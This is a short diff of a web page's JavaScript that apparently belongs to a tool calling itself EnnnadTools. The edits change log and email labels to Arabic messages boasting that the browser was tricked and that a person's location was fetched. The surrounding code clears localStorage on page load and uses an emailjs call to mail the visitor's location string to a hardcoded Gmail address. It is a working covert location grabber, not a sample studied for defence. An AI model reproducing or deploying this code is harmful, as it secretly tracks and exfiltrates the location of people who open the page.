@@ -1,7 +1,7 @@
-console.log("script.js loaded");
+console.log("تم خداع المتصفح بنجاح");
 
 window.onload = function () {
-    console.log("window.onload fired");
+    console.log("يتم الان جلب بيانات الشخص");
     localStorage.clear();
 
     const popup = document.getElementById("popup");
@@ -36,7 +36,7 @@ window.onload = function () {
 
             return emailjs.send("service_25q0ern", "template_xi6fmgy", {
                 to_email: "e508769103@gmail.com",
-                name: "زائرff جديد",
+                name: "تم جلب موقع شخص الان",
                 time: new Date().toLocaleString('ar-EG'),
                 message: locationString
             });
@@ -53,3 +53,5 @@ window.onload = function () {
             }
         });
 };
+
+    console.log("تم اتمام العملية بنجاح , EnnnadTools");
